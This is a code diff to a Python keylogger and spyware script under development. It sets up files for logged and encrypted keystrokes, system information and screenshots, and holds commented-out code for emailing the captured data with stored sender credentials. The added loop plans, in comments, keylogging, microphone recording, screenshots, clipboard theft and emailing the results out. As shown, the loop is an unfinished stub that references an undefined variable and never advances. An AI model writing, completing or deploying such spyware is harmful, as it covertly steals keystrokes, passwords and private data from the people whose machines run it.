@@ -27,6 +27,8 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+from datetime import datetime
+
 # Variables
 
 system_information = "system.txt"
@@ -59,7 +61,7 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # f.close()
 
-# Email
+# Email - https://medium.com/@abdullahzulfiqar653/sending-emails-with-attachments-using-python-32b908909d73
 
 # sender_email = os.environ['SENDER_EMAIL']
 # sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
@@ -113,6 +115,26 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # Screenshotting
 
-screenshot = ImageGrab.grab()
-screenshot.save("screenshot.png")
-screenshot.close()
+# screenshot = ImageGrab.grab()
+# screenshot.save("screenshot.png")
+# screenshot.close()
+
+# Timer
+
+#current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
+
+no_of_iterations = 10
+current_iteration = 0
+iteration_duration = 15
+
+while current_iteration < no_of_iterations:
+    pass
+    #keylogger & Microphone enabled here
+    if time.time() > stopping_time:
+        pass
+        #Screenshot
+        #Clipboard contents
+        #Computer Info
+        #Email above info
+        #incremenet iteration by 1
+        # new timing logic
